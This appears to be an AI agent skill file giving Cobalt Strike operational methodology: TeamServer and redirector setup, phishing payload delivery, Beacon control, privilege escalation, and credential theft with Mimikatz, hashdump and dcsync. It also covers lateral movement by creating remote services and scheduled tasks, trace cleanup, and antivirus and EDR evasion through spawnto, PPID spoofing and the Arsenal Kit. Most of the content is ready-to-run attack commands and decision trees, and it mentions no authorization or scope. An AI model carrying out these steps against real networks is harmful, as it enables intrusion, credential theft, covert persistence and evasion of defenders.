---
name: cobalt-strike
description: "Cobalt Strike operational methodology. Use when you need CS for collaborative team penetration testing, configuring Listeners/Payloads, managing Beacon sessions, performing post-exploitation operations (privilege escalation/lateral movement/credential theft), or writing Aggressor automation scripts. Covers TeamServer deployment, Listener configuration, Payload generation, Beacon management, post-exploitation commands, Malleable C2 Profile, and Aggressor script development"
zh-signals: "使用 Cobalt Strike 进行 TeamServer/Listener 配置、Beacon 管理与后渗透及 Aggressor 脚本开发。信号:Cobalt Strike,Beacon,C2,TeamServer,后渗透,Aggressor"
when-to-use: "Use when operating Cobalt Strike for team-based pentesting, configuring listeners/payloads, managing beacons, or writing Aggressor scripts."
metadata:
  tags: "cobalt strike,cs,beacon,c2,red team,teamserver,listener,payload,aggressor,malleable c2,post-exploitation,lateral movement,red team"
  category: "tool"
---

# Cobalt Strike Operational Methodology

Cobalt Strike (CS) is a commercial red team C2 framework that uses a C/S architecture to support collaborative penetration testing. Core advantages: **team collaboration** (multiple clients / multiple TeamServers) + **stealthy Beacon communications** (HTTP/HTTPS/DNS/SMB) + **a complete post-exploitation chain** (privilege escalation → credentials → lateral movement → persistence) + **Aggressor script extensibility**.

## Further Reading

- Detailed Beacon commands and post-exploitation techniques → [references/beacon-operations.md](references/beacon-operations.md)
- DNS/SMB/SSH Beacons and Arsenal Kit selection → [references/beacon-types-and-kits.md](references/beacon-types-and-kits.md)
- Aggressor script development guide → [references/aggressor-scripting.md](references/aggressor-scripting.md)

---

## Phase 1: TeamServer Deployment and Listener Configuration

### Starting the TeamServer

```bash
# Basic startup (Linux only)
./teamserver <public-IP> <password>

# Specify a Malleable C2 configuration file (recommended)
./teamserver <public-IP> <password> <profile-file-path>
```

**Deployment decisions:**
- A Malleable C2 Profile must be specified in production environments; the default traffic patterns are already flagged by major security products
- Use the c2lint tool to validate the profile: `./c2lint <profile>`

### Client Connection

```bash
# Linux
./start.sh
# Windows
start.bat
```

Connection requires: TeamServer IP + port (default 50050) + password. The first connection requires confirming the server fingerprint hash.

### Distributed Architecture Decision

```
Recommended three-tier server model:
├── Staging server → initial delivery, gaining a foothold (high exposure risk)
├── Long Haul server → low-frequency communication to maintain long-term access
└── Post-Ex server → interactive operations, lateral movement
```

**Decision criteria:** A single target can use a single TeamServer; multiple targets / long-term operations must be layered so that a single point of failure does not affect the whole operation.

### Listener Type Selection Decision Tree

```
Need to create a Listener?
├── Egress-enabled environment
│   ├── HTTP/HTTPS restricted but DNS available → DNS Beacon (low-frequency keepalive / backup channel)
│   ├── Standard scenario → HTTPS Beacon (recommended, encrypted transport)
│   └── Simple testing → HTTP Beacon
├── Internal network lateral movement / no egress
│   ├── Windows environment → SMB Beacon (named pipe, depends on SMB reachability and permissions)
│   ├── Linux/macOS or existing SSH credentials → SSH Beacon
│   └── Need to specify a port → TCP Beacon (forward bind)
└── Linkage with MSF → Foreign Listener (HTTP/HTTPS)
```

**Listener naming convention:** `OS/Payload/Stager`, for example `windows/beacon_https/reverse_https`

### Redirector Configuration

Purpose: protect the real TeamServer IP + improve reliability (run multiple redirectors in parallel)

```bash
# Forward with socat on the redirector host
socat TCP4-LISTEN:80,fork TCP4:<TeamServer_IP>:80
socat TCP4-LISTEN:443,fork TCP4:<TeamServer_IP>:443
```

Add the redirector IP to the Listener's HTTP Hosts so that victim traffic only interacts with the redirector.

---

## Phase 2: Payload Generation and Delivery

### Staged vs Stageless Selection

```
Payload type selection:
├── Staged → small size (~17KB), suitable for size-constrained scenarios
│   └── Stager executes first → calls back and downloads the Stage → loads and executes in memory
├── Stageless → large size (~300KB), fully self-contained
│   └── More stable, suitable for reliable delivery (e.g. phishing email attachment)
└── Security feature: the Stage encrypts metadata with the team server public key, the Stager has no such protection
```

### Payload Format Generation

| Path | Artifact | Purpose |
|------|--------|------|
| Packages → HTML Application | .hta file | Phishing with drop-and-execute |
| Packages → MS Office Macro | VBA macro code | Embed into Office documents |
| Packages → Payload Generator | Multi-language Payload | Custom AV-evasive loader |
| Packages → Windows Executable | .exe / .dll | Direct execution or DLL injection |
| Packages → Windows Executable (S) | Stageless .exe / .dll | Self-contained full Payload |

### Delivery Method Decision

```
How do you deliver it to the target?
├── Social engineering phishing
│   ├── Email attachment → Office macro document / HTA file
│   ├── Email link → Scripted Web Delivery generates a one-line command
│   └── Cloned website → Clone Site + embedded malicious link
├── Web vulnerability exploitation
│   ├── MSF linkage → set up a Foreign Listener, configure the matching payload in MSF
│   │   └── set DisablePayloadHandler True; set PrependMigrate True
│   └── Scripted delivery → Attacks → Web Drive-by → Scripted Web Delivery
└── Lateral delivery
    └── upload + remote service / scheduled task execution (see Phase 4)
```

---

## Phase 3: Beacon Management

### Session Interaction Basics

```
# Enter the Beacon console
Right-click a session → interact

# Communication mode control
sleep 60 50     # Asynchronous: call back every 60 seconds, 50% jitter (actually 30-60 seconds at random)
sleep 0         # Interactive mode: commands execute immediately (high OPSEC risk)
```

**OPSEC principle:** Keep `sleep >= 30s` for routine operations; only use `sleep 0` temporarily when real-time interaction is required, and restore it immediately afterwards.

### Session Passing

```
# Spawn a new session onto another Listener
spawn <listener_name>

# Inject into a specific process
inject <pid> <x86|x64> <listener_name>

# Pass to MSF
# 1. MSF starts a handler (windows/meterpreter/reverse_https)
# 2. CS creates a Foreign Listener pointing at MSF
# 3. spawn <foreign_listener>
```

### Pivoting (internal network pivoting)

```
How do hosts without egress check in?
├── SOCKS proxy (forward)
│   ├── beacon: socks <port>
│   ├── MSF: setg Proxies socks4:<CS_IP>:<port>
│   └── Tool: proxychains, configure it before use
├── Reverse port forwarding
│   ├── Right-click a session → Pivoting → Listener (open a Listener on a host that is already checked in)
│   └── Generate a Payload pointing at that Listener and run it on the host without egress
└── SSH tunnel
    ├── ssh -D 1080 user@<pivot_host>
    └── socat to forward traffic on a specific port
```

---

## Phase 4: Post-Exploitation Decision Tree

### Information Gathering

```
# Reconnaissance of the current environment
shell whoami /groups          # Current privilege level
shell net view /domain        # Current domain
net view                      # List of in-domain hosts (Beacon net module, richer output)
net dclist                    # List of domain controllers
```

### Privilege Escalation Decision Tree

```
Insufficient current privileges?
├── The current user is in the local administrators group (medium-integrity UAC)
│   ├── elevate → uac-token-duplication (Win7/Win10 before 2018.11)
│   ├── runasadmin → other UAC bypass exploits
│   └── A * appears next to the username after success
├── The current user is a standard user
│   ├── PowerUp to check for weaknesses
│   │   └── powershell-import PowerUp.ps1; powershell Invoke-AllChecks
│   ├── elevate → pick an available local privilege escalation exploit
│   └── Load the ElevateKit extension for more exploits
├── Local administrator (high privileges) → SYSTEM
│   └── getsystem (named pipe privilege escalation to SYSTEM)
└── Other user credentials are already available
    ├── spawnas <domain\user> <password> <listener>
    └── runas <domain\user> <password> <command>
```

### Credential Acquisition Decision Tree

```
Need to obtain credentials?
├── Already SYSTEM / local administrator
│   ├── hashdump                    → dump local SAM hashes
│   ├── logonpasswords              → Mimikatz grabs plaintext passwords
│   ├── mimikatz !lsadump::sam      → local account hashes
│   ├── mimikatz !lsadump::cache    → cached credentials (the last 10 are cached by default)
│   └── mimikatz !misc::memssp      → inject SSP to log subsequent logon passwords in plaintext
│       └── Results are saved to C:\windows\system32\mimilsa.log
├── On a domain controller
│   ├── hashdump                    → dump all domain user hashes
│   ├── dcsync                      → remotely replicate the AD database
│   └── mimikatz lsadump::dcsync /user:krbtgt → obtain the KRBTGT hash
└── View already collected credentials
    └── View → Credentials
```

**Mimikatz execution modes:**
- `mimikatz <command>` — execute with the current privileges
- `mimikatz !<command>` — force elevation to SYSTEM before executing
- `mimikatz @<command>` — execute using the current Beacon token

### Lateral Movement Decision Tree

```
How do you move to the target host?
├── Prerequisite: you already hold credentials trusted by the target host
│   ├── Token theft: ps → steal_token <pid>
│   ├── Credential creation: make_token <domain\user> <password>
│   ├── Pass-the-hash: pth <domain\user> <ntlm_hash>
│   └── Golden Ticket: Access → Golden Ticket (requires the KRBTGT hash + domain SID)
│
├── Automated lateral movement (recommended, fileless)
│   ├── psexec <target> <listener>       → service execution (drops an EXE to disk)
│   ├── psexec_psh <target> <listener>   → service execution of PowerShell
│   ├── winrm <target> <listener>        → WinRM execution of PowerShell
│   └── wmi <target> <listener>          → WMI execution of PowerShell
│   └── Graphical: View → Targets → right-click → Jump
│
├── Manual lateral movement
│   ├── Method 1: Windows service
│   │   ├── upload beacon.exe
│   │   ├── shell copy beacon.exe \\target\C$\Windows\Temp
│   │   ├── shell sc \\target create svc binpath= C:\Windows\Temp\beacon.exe
│   │   ├── shell sc \\target start svc
│   │   └── link <target> (SMB Beacon)
│   └── Method 2: Scheduled task
│       ├── shell net time \\target (confirm the time)
│       ├── shell at \\target HH:mm C:\path\beacon.exe
│       └── link <target> (SMB Beacon)
│
└── Clean up traces
    ├── shell sc \\target delete svc
    ├── shell del \\target\C$\Windows\Temp\beacon.exe
    └── shell del beacon.exe
```

### Key In-Domain Enumeration Commands

```
# Discover Domain Admins
shell net group "domain admins" /domain
shell net group "enterprise admins" /domain
shell net localgroup "administrators" /domain

# PowerView advanced enumeration (avoids detection of net commands)
powershell-import PowerView.ps1
powershell Find-LocalAdminAccess          # Discover local admin access for the current user
powershell Get-NetDomain                  # Domain information
powershell Invoke-ShareFinder             # Share discovery
powershell Get-NetLocalGroup -Hostname <target>  # Local administrators on the target
```

---

## Phase 5: OPSEC and Stealth

### Malleable C2 Profile

**Purpose:** customize the traffic fingerprints of Beacon communications so that they look like normal business traffic.

```
# Basic profile structure
set sleeptime "60000";     # Callback interval (milliseconds)
set jitter "50";           # Jitter percentage
set useragent "Mozilla/5.0 ...";

http-get {
    set uri "/api/v1/updates";
    client {
        header "Accept" "application/json";
        metadata {
            netbios;
            append "-.jpg";
            uri-append;
        }
    }
    server { ... }
}

http-post {
    set uri "/api/v1/submit";
    client { ... }
    server { ... }
}
```

**Key configuration items:**
- `sleeptime` + `jitter` — control communication frequency and randomness
- `spawnto` — specify the process used by spawn/inject (avoids rundll32.exe)
- `set host_stage "false"` — disable staging (prevents the Stager from being found by scanners)

### Process Injection OPSEC

```
# Use spawnto to avoid the default rundll32.exe
spawnto x64 %windir%\sysnative\svchost.exe -k netsvcs
spawnto x86 %windir%\syswow64\svchost.exe -k netsvcs

# PPID spoofing — make the new process look like it was created by a legitimate parent process
ppid <legitimate-process-PID>
```

### Arsenal Kit and AV Evasion Strategy

```
Choose the matching approach:
├── Artifact Kit → custom EXE/DLL generation templates
│   └── Use when the generated artifact is detected statically as soon as it lands on disk
├── Resource Kit → modify HTA/PowerShell/VBA/VBS script templates
│   └── Use when the default delivery template has obvious fingerprints
├── Sleep Mask / Mutator / Thread Stack Spoofer
│   └── Use when memory scanning or thread stack detection pressure is high
├── Custom loader → Payload Generator outputs raw shellcode
│   └── Write a custom loader in C/Go/Rust
└── Note: a Kit can only reduce specific detection surfaces, it cannot replace traffic, process chain, and privilege OPSEC
```

See [references/beacon-types-and-kits.md](references/beacon-types-and-kits.md) for the detailed selection boundaries.

---

## Quick Reference: Most Commonly Used Beacon Commands

| Command | Description |
|------|------|
| `sleep <seconds> [jitter%]` | Set the callback interval and jitter |
| `shell <command>` | Execute a command via cmd.exe |
| `powershell <command>` | Execute via powershell.exe |
| `powerpick <command>` | Execute a PS command without powershell.exe |
| `execute-assembly <path>` | Load a .NET assembly in memory |
| `upload / download` | Upload / download files |
| `hashdump` | Dump SAM hashes |
| `logonpasswords` | Mimikatz grabs passwords |
| `steal_token <pid>` | Steal a process token |
| `make_token <domain\user> <pass>` | Create a token |
| `pth <domain\user> <hash>` | Pass-the-Hash |
| `rev2self` | Restore the original token |
| `spawn <listener>` | Spawn a new session |
| `inject <pid> <arch> <listener>` | Inject into a process |
| `socks <port>` | Start a SOCKS proxy |
| `link / unlink <target>` | Connect / disconnect an SMB/TCP Beacon |
| `ps` | List processes |
| `jobs / jobkill <id>` | Manage background jobs |
| `screenshot / keylogger` | Take screenshots / keylog |
| `getsystem` | Escalate to SYSTEM |
| `elevate <exploit> <listener>` | Escalate with an exploit |
| `portscan <targets> <ports> <method>` | Port scanning (arp/icmp/none) |
| `clear` | Clear the command queue |
